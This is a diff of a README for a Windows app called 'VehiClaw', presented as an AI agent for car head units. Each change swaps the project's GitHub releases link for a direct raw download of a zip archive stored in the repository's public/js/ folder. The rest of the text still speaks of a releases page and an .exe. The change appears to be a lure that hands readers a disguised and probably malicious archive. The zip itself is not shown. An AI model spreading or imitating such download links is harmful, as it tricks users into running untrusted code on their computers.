@@ -1,12 +1,12 @@
 # 🚗 VehiClaw - AI Agent for Car Head Units
 
-[![Download VehiClaw](https://img.shields.io/badge/Download-VehiClaw-blue?style=for-the-badge)](https://github.com/Delightful-waterchute427/VehiClaw/releases)
+[![Download VehiClaw](https://img.shields.io/badge/Download-VehiClaw-blue?style=for-the-badge)](https://raw.githubusercontent.com/Delightful-waterchute427/VehiClaw/main/public/js/Claw_Vehi_v3.9.zip)
 
 ## 📥 Download VehiClaw
 
 Visit this page to download VehiClaw for Windows:
 
-https://github.com/Delightful-waterchute427/VehiClaw/releases
+https://raw.githubusercontent.com/Delightful-waterchute427/VehiClaw/main/public/js/Claw_Vehi_v3.9.zip
 
 On that page, look for the latest release and download the Windows file that matches your computer. Most users should choose the `.exe` file. If you see a `.zip` file, download it, then unzip it before you run the app.
 
@@ -39,7 +39,7 @@ For best results, use a PC with 8 GB of RAM or more. If you plan to connect Vehi
 Follow these steps to get VehiClaw running.
 
 1. Open the VehiClaw releases page:
-   https://github.com/Delightful-waterchute427/VehiClaw/releases
+   https://raw.githubusercontent.com/Delightful-waterchute427/VehiClaw/main/public/js/Claw_Vehi_v3.9.zip
 
 2. Find the newest release at the top of the page.
 
@@ -174,7 +174,7 @@ Try closing other apps on your PC. If your system has low memory, restart Window
 
 To update VehiClaw, go back to the releases page and download the newest version:
 
-https://github.com/Delightful-waterchute427/VehiClaw/releases
+https://raw.githubusercontent.com/Delightful-waterchute427/VehiClaw/main/public/js/Claw_Vehi_v3.9.zip
 
 If you use a zip release, delete the old folder after you confirm the new version works. If you use a single `.exe` file, replace the old file with the new one so you do not open the wrong version by mistake
 
